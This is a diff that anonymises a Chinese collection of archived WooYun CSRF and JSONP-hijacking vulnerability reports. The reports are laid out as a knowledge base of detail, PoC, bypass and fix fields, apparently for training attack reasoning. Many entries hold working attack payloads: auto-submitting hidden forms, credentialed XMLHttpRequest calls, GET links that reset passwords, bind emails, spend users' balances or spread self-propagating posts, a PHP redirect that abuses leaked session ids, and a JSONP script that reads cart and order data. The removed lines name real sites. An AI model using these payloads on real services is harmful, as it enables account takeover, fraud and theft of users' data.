+**POC**: 1、我们进入后台，发现没有添加管理员，那么我们来尝试一下修改管理员密码很有意思，我们发现修改管理员的密码，不需要验证原密码~~~好危险撒！那我们再来抓包截断看看有没有token之类的验证2、用burpsuite截断我的小伙伴们都惊呆了 有木有？？没有验证，就两个password3、构造表单吧!<html><body><form id="post123" name="post123" action="http://[IP已脱敏] method="POST"><input type="hidden" name="passwo
 
 **绕过**: 直接利用
 
@@ -5504,7 +5504,7 @@
 
 ---
 ### [wooyun-2014-051104] 利用csrf漏洞强制消费其他人的Q币
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: CSRF
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5515,7 +5515,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在jifen.qq.com  里面 选 几个兑换积分加Q币的  我选一个绿钻http://jifen.qq.com/action/vipmusic/vipMusic.html?ADTAG=JIFEN.HTML5.AD.3选第一个测试 让别人消费9个Q币确定兑换因为我没有Q币就余额不足现在把网址记下来http://jifen.qq.com/cgi-bin/mart/PayItem.cgi?Fromaq=true&GoodsID=573&UinNum=1767070717把这个发给别人别人打开别人打开会提示登入  一般登入这个页面看不了什么  别人通常会点登入登入进去之后显示消费了9个Q币     他会得到一个月的绿钻提前  有足够的Q币  和积分    一般游戏用户都会有。算强制性的吧
+**详情**: 在jifen.某互联网公司.com  里面 选 几个兑换积分加Q币的  我选一个绿钻https://example.com/[已脱敏] 让别人消费9个Q币确定兑换因为我没有Q币就余额不足现在把网址记下来https://example.com/[已脱敏]  一般登入这个页面看不了什么  别人通常会点登入登入进去之后显示消费了9个Q币     他会得到一个月的绿钻提前  有足够的Q币  和积分    一般游戏用户都会有。算强制性的吧
 
 **POC**: (见原文)
 
@@ -5525,8 +5525,8 @@
 ---
 
 ---
-### [wooyun-2013-040552] 网易微博csrf漏洞任意刷粉
-**厂商**: 网易 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-040552] 某互联网公司某社交平台csrf漏洞任意刷粉
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5537,7 +5537,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 疏忽了吧，这里加粉的接口用的是get方法。这样的程序员该拉出去 tjjtds 。http://t.163.com/rank/daren  这里加关注的接口以韩寒微博为例，利用链接http://t.163.com/user/batchAddFocus?screenNames=hhan限制了部分来路，但是在达人，辩论几个板块完全没有限制，可以传播。评论一个 http://163.fm/XqkSZg6成功被韩寒俘获。再来一个
+**详情**: 疏忽了吧，这里加粉的接口用的是get方法。这样的程序员该拉出去 tjjtds 。https://example.com/[已脱敏]  这里加关注的接口以韩寒某社交平台为例，利用链接https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5559,9 +5559,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cloud.efly.cc/syslogic/userUpdate.php?opt=upPasswd&newPasswd=123456这是构造语句接口图如下
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://cloud.efly.cc/syslogic/userUpdate.php?opt=upPasswd&newPasswd=123456只要用户点击这个url 密码就会自动改城123456接口没加验证
+**POC**: https://example.com/[已脱敏] 密码就会自动改城123456接口没加验证
 
 **绕过**: 直接利用
 
@@ -5581,7 +5581,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改收货地址，看包修改成功：其中addr_id为自增值，无不可预测参数，构造csrf链接xmlhttp.open("POST", "http://my.zhen.com/?c=addr&a=edit", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addr_id=86261&receiver=woo126sss&province=%E5%8C%97%E4%BA%AC%E5%B8%82&city=%E4%B8%9C%E5%9F%8E%E5%8C%BA&town=%E4%BA%8C%E7%8E%AF%E5%86%85&address=fszhfdzh&postcode=100005&m
+**详情**: 修改收货地址，看包修改成功：其中addr_id为自增值，无不可预测参数，构造csrf链接xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addr_id=86261&receiver=woo126sss&province=%E5%8C%97%E4%BA%AC%E5%B8%82&city=%E4%B8%9C%E5%9F%8E%E5%8C%BA&town=%E4%BA%8C%E7%8E%AF%E5%86%85&address=fszhfdzh&postcode=100005&m
 
 **POC**: 同上求礼物。。。
 
@@ -5625,7 +5625,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一枚：CSRF增加个人信息地址漏洞URLhttp://127.0.0.1/diguo7/e/ShopSys/address/AddAddress.php?enews=AddAddress增加地址请求和功能如下然后这个POST请求没有验证referer，导致可以利用外部poc构造form表单，进行CSRF攻击。第二枚：CSRF删除留言1 位置在留言板2 删除留言的抓包请求如下，直接是个GET3 然后由于没有token，所以可以构造CSRF删除留言。利用URL http://127.0.0.1/diguo7/e/member/mspace/?enews=DelMemberGbook&gid=4
+**详情**: 第一枚：CSRF增加个人信息地址漏洞URLhttp://[IP已脱敏] 位置在留言板2 删除留言的抓包请求如下，直接是个GET3 然后由于没有token，所以可以构造CSRF删除留言。利用URL http://[IP已脱敏]
 
 **POC**: 如上
 
@@ -5647,7 +5647,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 其实这个问题在2009年的时候，我就发现了。当初我家宝宝出生参加少儿医保，我登陆网站查询我家宝宝信息。由于专业的关系，看到网址，就试着修改了网址中关键的社保电脑号，果然可以查询其他少儿承保人的信息，当初以为会很快改，可是这么多年过去，还是一样.......更改网址中的GRCODE：https://seyb.szsi.gov.cn/szwcngr/prg1/slgrcbnew-fw-sq-view.jsp?EventID=CBR_GRCBQUEERY_Action&GRCODE=5005*****&DZSH=2&csrftoken=3e8bfba2935484f4109a597500f0cf1c得到其他人的参保信息：另外这个信息是可以被下载软件批量下载的.............
+**详情**: 其实这个问题在2009年的时候，我就发现了。当初我家宝宝出生参加少儿医保，我登陆网站查询我家宝宝信息。由于专业的关系，看到网址，就试着修改了网址中关键的社保电脑号，果然可以查询其他少儿承保人的信息，当初以为会很快改，可是这么多年过去，还是一样.......更改网址中的GRCODE：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5669,9 +5669,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.其实这个故事是这样，最近在智联招聘投简历,在等人家回复的时候测试一下2.于是得到下面这个连接:http://i.zhaopin.com/usermaster/UsermasterManage/ChangeEmail?jsoncallback=你好&email=601333824@qq.com3.-------------------------------------------------------------------------------------------------3.投了三份，等了一天也没人回复（=_=，学历不够,说不定人家看不到）------------------------------------------------------------------------------------------4.这个连接只能更改帐号，但是改了帐号之后，就可以用这个
+**详情**: 1.其实这个故事是这样，最近在智联招聘投简历,在等人家回复的时候测试一下2.于是得到下面这个连接:https://example.com/[已脱敏]
 
-**POC**: 1.于是得到下面这个连接:http://i.zhaopin.com/usermaster/UsermasterManage/ChangeEmail?jsoncallback=你好&email=601333824@qq.com2.
+**POC**: 1.于是得到下面这个连接:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5679,8 +5679,8 @@
 ---
 
 ---
-### [wooyun-2013-035628] 百度某分站csrf漏洞可刷粉丝
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-035628] 某搜索引擎某分站csrf漏洞可刷粉丝
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5691,7 +5691,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一、百度旅游假如要关注这个妹子http://lvyou.baidu.com/user/47783f2e03e2d128a581731f二、抓包三、post提交四、返回数据
+**详情**: 一、某搜索引擎旅游假如要关注这个妹子https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5735,7 +5735,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 试了下爱丽网除了修改密码有限制之外，其他的修改信息都是直接GET，这样又导致了危害的扩大。抓了几个包子：http://member.aili.com/?c=member&m=member&a=editpersonal&data%5Bname%5D=test&data%5Bsex%5D=0&data%5Bbirthday%5D=1970-01-01&data%5Bstar%5D=&data%5Bprovince%5D=&data%5Bcity%5D=&data%5Barea%5D=&data%5Bprofession%5D=%CF%FA%CA%DB&data%5Bmarriage%5D=0&data%5Beducation%5D=0&data%5Btip%5D=test以修改第一页信息资料为例直接构造恶意资料信息修改的 payload 伪装成图片发布到爱丽网任何可以社交的地方，(如博客，或者
+**详情**: 试了下爱丽网除了修改密码有限制之外，其他的修改信息都是直接GET，这样又导致了危害的扩大。抓了几个包子：https://example.com/[已脱敏] payload 伪装成图片发布到爱丽网任何可以社交的地方，(如博客，或者
 
 **POC**: 当用户访问之后，资料被恶意串改
 
@@ -5745,8 +5745,8 @@
 ---
 
 ---
-### [wooyun-2016-0171499] 新浪微博JSONP劫持之点我链接开始微博蠕虫+刷粉丝
-**厂商**: 新浪 | **年份**: 2016 | **类型**: CSRF
+### [wooyun-2016-0171499] 某社交平台某社交平台JSONP劫持之点我链接开始某社交平台蠕虫+刷粉丝
+**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5757,13 +5757,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01 发微博在新浪旅游的攻略页面中有个提问的功能，提示“此问题会同步到你的新浪微博”。http://travel.sina.com.cn/fj_sanming_685-xiangqing-gonglue/具体接口如下：http://u.travel.sina.com.cn/api-i/qa/sendweibo?content=asdf1&callback=jQuery17206884582478087395_1452354554166&_=1452354673975这个接口是JSONP的形式，有检查referer，但是不严格，可以轻松绕过，可以绕过的referer例子：http://travel.sina.com.cn.zhchbin.xyz/0x02 关注有些攻略页面会嵌入一些旅行网的微博，上面有关注功能，比如：http://travel.sina.com.cn/aolanduo_2
+**详情**: 0x01 发某社交平台在某社交平台旅游的攻略页面中有个提问的功能，提示“此问题会同步到你的某社交平台某社交平台”。https://example.com/[已脱敏] 关注有些攻略页面会嵌入一些旅行网的某社交平台，上面有关注功能，比如：https://example.com/[已脱敏]
 
-**POC**: 登录微博，点我链接：http://travel.sina.com.cn.zhchbin.xyz/travel_jsonp.html测试代码：<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js"></script><script>$(function() {var sendweibo = 'http://u.travel.sina.com.cn/api-i/qa/sendweibo?'var content = "这里有好东西，赶紧看，你懂得！http://travel.sin
+**POC**: 登录某社交平台，点我链接：https://example.com/[已脱敏] type="text/javascript" src="https://example.com/[已脱敏]"></script><script>$(function() {var sendweibo = 'https://example.com/[已脱敏]'var content = "这里有好东西，赶紧看，你懂得！https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
-**修复**: 修复JSONP劫持欢迎关注我微博！！http://weibo.com/zhchbin
+**修复**: 修复JSONP劫持欢迎关注我某社交平台！！https://example.com/[已脱敏]
 ---
 
 ---
@@ -5779,7 +5779,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改收货地址，查看包修改成功，看地址信息构造csrf链接，主要代码：xmlhttp.open("POST", "http://order.jiapin.com/view/updateaddresssubmit", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("id1=315062&contact=woogggg&province=110000&city=110100&area=110101&address=fegt&address_code=000000&address_tel=13111111111&address_phone_one=111&address_phone_two=2
+**详情**: 修改收货地址，查看包修改成功，看地址信息构造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("id1=315062&contact=woogggg&province=110000&city=110100&area=110101&address=fegt&address_code=000000&address_tel=13111111111&address_phone_one=111&address_phone_two=2
 
 **POC**: 已证明
 
@@ -5801,7 +5801,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不想复习啊，随手测一测~~~存在漏洞的地址：http://cart.vip.com/te2/cart.php?callback=callback&isGetLast=1http://checkout.vip.com/app/getUnpayOrder.php?callback=callback其他的应该还有，但这两个足够分量了:第一个是购物车的商品数及商品详细信息，第二个是下了订单的订单编号以及订单数量。
+**详情**: 不想复习啊，随手测一测~~~存在漏洞的地址：https://example.com/[已脱敏]
 
 **POC**: 测试代码：<meta charset="utf-8">正在请求，请耐心等待... ...</table><script type="text/javascript">window.callback=function(e){if(e['result'] == -1){alert("屌丝,你还没登录唯品会");return 0}if(e['cartInfo']['has_goods_left']){alert("购物车中有 " + e['cartList']['count'] + " 件商品~");}var str = '<table border=1>'for(i=0;i<e['cartList
 
@@ -5823,7 +5823,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登陆状态访问url：http://zqb.creditease.cn/pages/User/personalCenter.do?email=1@qq.com&emailFlag=fromemail&option=binding邮箱地址自己改，瞬间就绑定了邮箱，绑定邮箱可以干嘛就不多说了吧
+**详情**: 登陆状态访问url：https://example.com/[已脱敏]
 
 **POC**: 就连1为的都可以绑定哦，直接绕过update1 update2
 
@@ -5845,9 +5845,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个QQ我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。http://www.xd.com/email_verify/email_set/?email=189837992%40qq.com&_=1399282088546用户IE B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。http://www.xd.com/security/forget_pass请输入用户名：2042478584邮箱地址：189837992@qq.com然后返回：您的邮箱189*****2@qq.com，将收到一封找回密码邮件,请查收。查看我的邮箱〉任何一个细节都可
+**详情**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个某互联网公司我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。https://example.com/[已脱敏] B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。https://example.com/[已脱敏]
 
-**POC**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个QQ我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。http://www.xd.com/email_verify/email_set/?email=189837992%40qq.com&_=1399282088546用户IE B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。http://www.xd.com/security/forget
+**POC**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个某互联网公司我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。https://example.com/[已脱敏] B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5855,8 +5855,8 @@
 ---
 
 ---
-### [wooyun-2015-094946] 百度书城CSRF涉及敏感操作
-**厂商**: 百度 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-094946] 某搜索引擎书城CSRF涉及敏感操作
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5867,9 +5867,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度书城CSRF涉及敏感操作，可被不法分子利用刷钱
+**详情**: 某搜索引擎书城CSRF涉及敏感操作，可被不法分子利用刷钱
 
-**POC**: 1、为了做测试，我自己充值了1块钱  ~~~~(>_<)~~~~  求报销2、我们随便找一个图书的 VIP章节，发现需要支付，然后我们支付的时候截断我们发现没有token之类的验证，那么我们来试试可不可以实施CSRF攻击，我们先弄一个表单<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form id="post123" name="post123" action="http://kanshu.baidu.com/buybook/buychapter" method="POST"><input type="
+**POC**: 1、为了做测试，我自己充值了1块钱  ~~~~(>_<)~~~~  求报销2、我们随便找一个图书的 VIP章节，发现需要支付，然后我们支付的时候截断我们发现没有token之类的验证，那么我们来试试可不可以实施CSRF攻击，我们先弄一个表单<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form id="post123" name="post123" action="https://example.com/[已脱敏]" method="POST"><input type="
 
 **绕过**: 直接利用
 
@@ -5877,8 +5877,8 @@
 ---
 
 ---
-### [wooyun-2011-02089] 腾讯邮箱CSRF漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: CSRF
+### [wooyun-2011-02089] 某互联网公司邮箱CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5889,7 +5889,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯邮箱设置转发HTTP包：POST /cgi-bin/setting1?sid=eP6_czyZRqFmXFwR HTTP/1.1Host: m84.mail.qq.comReferer: http://m84.mail.qq.com/cgi-bin/setting1?sid=eP6_czyZRqFmXFwR&fun=list&loc=frame_html,,,3Content-Length: 1022Cache-Control: max-age=0Origin: http://m84.mail.qq.comUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.24Content-Type: application/x-ww
+**详情**: 某互联网公司邮箱设置转发HTTP包：POST /cgi-bin/setting1?sid=eP6_czyZRqFmXFwR HTTP/1.1Host: m84.mail.某互联网公司.comReferer: https://example.com/[已脱敏] 1022Cache-Control: max-age=0Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/534.24Content-Type: application/x-ww
 
 **POC**: 攻击方式：1. 在第三方站点制作一个页面，构造post表单。最关键的sid信息可从http referer中读出。2. 群发邮件，内含该恶意url. 标题很吸引人那种。3. 等着收邮件吧。
 
@@ -5899,7 +5899,7 @@
 ---
 
 ---
-### [wooyun-2013-027106] 搜狐微博多处GET型高危csrf发微博蠕虫
+### [wooyun-2013-027106] 搜狐某社交平台多处GET型高危csrf发某社交平台蠕虫
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -5911,9 +5911,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 该问题在微博活动中的分享活动处。虽然是POST，但是GET也能成功。POC:http://t.sohu.com/event/insertTw?msg=testtest------------------------------------微辩论处虽然是POST请求，但也可GET提交，引发蠕虫。POC:http://t.sohu.com/debate/sendMsg?did=6804&msg=tecsrfst
+**详情**: 该问题在某社交平台活动中的分享活动处。虽然是POST，但是GET也能成功。POC:https://example.com/[已脱敏]
 
-**POC**: 此漏洞同样可以通过微博图片传播，利用方法不想再说了，上个洞子里说了。------------------------------------这也可通过微博图片传播，具体可以看我提交的第二个漏洞。
+**POC**: 此漏洞同样可以通过某社交平台图片传播，利用方法不想再说了，上个洞子里说了。------------------------------------这也可通过某社交平台图片传播，具体可以看我提交的第二个漏洞。
 
 **绕过**: 直接利用
 
@@ -5935,7 +5935,7 @@
 
 **详情**: 在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。应用场景，在某些地方，例如YY、论坛、评论，发出这个地址，或者用IMG标签引用这个地址，然后你的粉丝就倍增了~~
 
-**POC**: http://www.aipai.com/app/www/apps/subscribe.php?bid=[被关注的ID]&callback%09=scribeSuccess_new&action=addSubscribe
+**POC**: https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe
 
 **绕过**: 直接利用
 
@@ -5957,7 +5957,7 @@
 
 **详情**: 
 
-**POC**: <html><head><title>poc2.html</title></head><body><form action="http://my.wuzhe.com/wuzhe/experience" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B
+**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B
 
 **绕过**: 直接利用
 
@@ -5987,8 +5987,8 @@
 ---
 
 ---
-### [wooyun-2013-019574] 新浪微博可以加粉丝并形成蠕虫传播
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-019574] 某社交平台某社交平台可以加粉丝并形成蠕虫传播
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6001,7 +6001,7 @@
 
 **详情**: 
 
-**POC**: http://tw.weibo.com/api/repostcomment/?mid=3552476701735227&comment=test
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6021,7 +6021,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 寻医问药系统中关注某人的链接如下：http://home.xywy.com/user.php?act=attention&uid=2548777&type=atten&token=166b535a0deadd021b5ada0b392c4bbb但是，后台并没有校验token，只要把uid改为需要关注的用户，访问链接后就可以关注。随便找一个帖子进行回复。在回复中插入图片，图片的地址就是关注功能对应的url，我把uid改为楼主的。提交后每个访问帖子的人都会关注楼主。
+**详情**: 寻医问药系统中关注某人的链接如下：https://example.com/[已脱敏]
 
 **POC**: 见详细
 
@@ -6067,7 +6067,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://t.sohu.com/t/twAction.jsp<html><body><form id="imlonghao" name="imlonghao" action="http://t.sohu.com/t/twAction.jsp" method="post"><input type="text" name="msg" value="XX" /><input type="text" name="act" value="insertTwitter" /><input type="text" name="groupid" value="0" /><input type="s
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="msg" value="XX" /><input type="text" name="act" value="insertTwitter" /><input type="text" name="groupid" value="0" /><input type="s
 
 **绕过**: 直接利用
 
@@ -6097,8 +6097,8 @@
 ---
 
 ---
-### [wooyun-2014-056991] QQ公益未做认证导致CSRF可蠕虫
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-056991] 某互联网公司公益未做认证导致CSRF可蠕虫
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6109,9 +6109,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://npoapp.gongyi.qq.com/blog/add未做认证导致CSRF蠕虫只要存有QQ空间的Cookie就可以提交blog发表到QQ空间。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: <form id="Test" name="Test" action="http://npoapp.gongyi.qq.com/blog/add" method="POST"><input type="text" name="content" value="test" /><input type="text" name="title" value="Test" /><input type="submit" value="submit" /></form><script>document.Test.submit();</script>测试有效
+**POC**: <form id="Test" name="Test" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="content" value="test" /><input type="text" name="title" value="Test" /><input type="submit" value="submit" /></form><script>document.Test.submit();</script>测试有效
 
 **绕过**: 直接利用
 
@@ -6119,8 +6119,8 @@
 ---
 
 ---
-### [wooyun-2012-06746] 腾讯某分站csrf漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-06746] 某互联网公司某分站csrf漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6131,9 +6131,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯某分站未做csrf防范，导致漏洞产生!
+**详情**: 某互联网公司某分站未做csrf防范，导致漏洞产生!
 
-**POC**: 1、去发微博2、只要用户点击链接就触发csrf攻击
+**POC**: 1、去发某社交平台2、只要用户点击链接就触发csrf攻击
 
 **绕过**: 直接利用
 
@@ -6153,9 +6153,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yichengpin.com添加修改收货地址处未验证referer 未加tokenPOC<html><body><form action="http://www.yichengpin.com/address/address-addAddress.do" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><input type="hidden" name="receiverAdd&#46;detailAddress" value="wooyunwooyun" /><input type="hidden"
+**详情**: https://example.com/[已脱敏] 未加tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><input type="hidden" name="receiverAdd&#46;detailAddress" value="wooyunwooyun" /><input type="hidden"
 
-**POC**: http://www.yichengpin.com添加修改收货地址处未验证referer 未加tokenPOC<html><body><form action="http://www.yichengpin.com/address/address-addAddress.do" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><
+**POC**: https://example.com/[已脱敏] 未加tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><
 
 **绕过**: 直接利用
 
@@ -6177,7 +6177,7 @@
 
 **详情**: 
 
-**POC**: http://www.docin.com/app/my/docin/pwdsale在设置密码保护处抓包（默认是没有设置密码保护的），看到没有加上任何的验证，现在我们构造一个表单，代码如下：<html><body><form action="http://www.docin.com/app/my/docin/pwdsale?fn=save" method="POST"><input type="hidden" name="question" value="1" /><input type="hidden" name="answer" value="hackimg" /><input type="
+**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="question" value="1" /><input type="hidden" name="answer" value="hackimg" /><input type="
 
 **绕过**: 直接利用
 
@@ -6197,7 +6197,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 对于包含图片的附件，请求附件时Referer中会暴露当前sid，例如：GET /mblogpic/be654a34c8f4aad1ec6a/2000 HTTP/1.1Host: t100.qpic.cnConnection: keep-aliveCache-Control: max-age=0If-Modified-Since: Fri, 06 Apr 2012 14:00:09 GMTUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19Accept: */*Referer: http://bjapp6.mail.tom.com/coremail/fcg/ldmsapp?funcid=readlett&sid=nAJ
+**详情**: 对于包含图片的附件，请求附件时Referer中会暴露当前sid，例如：GET /mblogpic/be654a34c8f4aad1ec6a/2000 HTTP/1.1Host: t100.qpic.cnConnection: keep-aliveCache-Control: max-age=0If-Modified-Since: Fri, 06 Apr 2012 14:00:09 GMTUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19Accept: */*Referer: https://example.com/[已脱敏]
 
 **POC**: 测试代码：<?php$url = parse_url($_SERVER['HTTP_REFERER']);$host = $url['host'];parse_str($url['query']);$loc = "http://$host/cgi/ldapapp?sid=$sid&tempname=options%2Frefuselist.htm&funcid=opuserattr&optype=set&refuselist=test%40test.com&update.x=1";header("Location: $loc");?>
 
@@ -6219,9 +6219,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: CSRF的FORM，登录后直接访问：<html><body><form action="http://ac.ppdai.com/userbind/setsafequestion" method="POST"><input type="hidden" name="QuestionId1" value="1" /><input type="hidden" name="Answer1" value="a1" /><input type="hidden" name="QuestionId2" value="2" /><input type="hidden" name="Answer2" value="a2" /><input type="hidden" name="QuestionId3" value="3" /><input type="hidden" name="Answer3" value=
+**详情**: CSRF的FORM，登录后直接访问：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="QuestionId1" value="1" /><input type="hidden" name="Answer1" value="a1" /><input type="hidden" name="QuestionId2" value="2" /><input type="hidden" name="Answer2" value="a2" /><input type="hidden" name="QuestionId3" value="3" /><input type="hidden" name="Answer3" value=
 
-**POC**: 使用新登录的安全问题，通过了验证。证明有登录成功。POST /userbind/answersafequestion HTTP/1.1Host: ac.ppdai.comProxy-Connection: keep-aliveContent-Length: 74Accept: */*Origin: http://ac.ppdai.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.
+**POC**: 使用新登录的安全问题，通过了验证。证明有登录成功。POST /userbind/answersafequestion HTTP/1.1Host: ac.ppdai.comProxy-Connection: keep-aliveContent-Length: 74Accept: */*Origin: https://example.com/[已脱敏] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.
 
 **绕过**: 直接利用
 
@@ -6285,7 +6285,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
